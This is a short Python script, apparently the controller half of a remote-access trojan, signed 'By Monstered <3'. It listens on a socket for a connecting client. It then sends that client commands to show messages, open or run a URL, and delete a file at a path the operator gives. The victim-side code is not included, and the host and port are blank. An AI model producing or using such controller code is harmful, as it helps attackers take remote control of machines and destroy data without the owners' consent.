# By Monstered <3
# No skid

import socket
import ctypes
import os
import webbrowser

PcList = []

host = "" # IP
port =    # PORT

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((host, port))

server.listen()

client, address = server.accept()

name = socket.gethostname()
PcList.append(name)

print(PcList)

while True:
    cmd_input= input("Enter a command: ")

    if cmd_input == "message":
        client.send(cmd_input.encode())
        msg = input("Please enter the message: ")
        client.send(msg.encode())
        print("Command has been executed successfully")
    elif cmd_input == "run":
        client.send(cmd_input.encode())
        url = input("Enter url: ")
        client.send(url.encode())
        print("Command has been executed successfully")
    elif cmd_input == "delete":
        client.send(cmd_input.encode())
        file = input("file dir: ")
        client.send(file.encode())
        print("Command has been executed successfully")